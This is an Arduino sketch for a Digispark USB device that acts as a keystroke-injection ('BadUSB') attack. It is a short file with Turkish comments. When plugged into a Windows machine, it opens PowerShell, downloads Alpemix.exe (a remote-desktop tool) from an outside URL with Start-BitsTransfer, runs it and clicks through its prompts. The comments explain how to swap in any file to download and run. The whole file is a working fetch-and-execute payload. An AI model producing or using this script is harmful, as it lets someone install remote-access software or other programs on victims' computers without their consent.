#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // HTTPS KISMINDAN İTİBAREN İNDİRMEK İSTEDİĞİNİZ DOSYASNIN KONUMUNU GİRİNİZ BİR BOŞLUK BIRAKIP NE KAYDEDİLME İSMİNİ GİRİN ÖRN:DENEME.EXE
  DigiKeyboard.print("Start-Bitstransfer https://www.alpemix.com/site/Alpemix.exe Alpemixx.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // BURADAKİ SANİYE MİKTARI DOSYANIN BOYUTUNA GÖRE DÜŞÜRÜLÜR VEYA YÜKSELTİLİR:
  DigiKeyboard.delay(8000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  // 20.SATIRSA KAYDETTİĞİNİZ İSMİ GİRİNİZ ÖRN:DENEME.EXE
  DigiKeyboard.print("Alpemixx.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // BURADAKİ 100000 SANİYE KOMUTLAR BİTTİKTEN SONRA EN BAŞTAN TEKRARLAMASIN DİYE.
  DigiKeyboard.delay(100000);
}
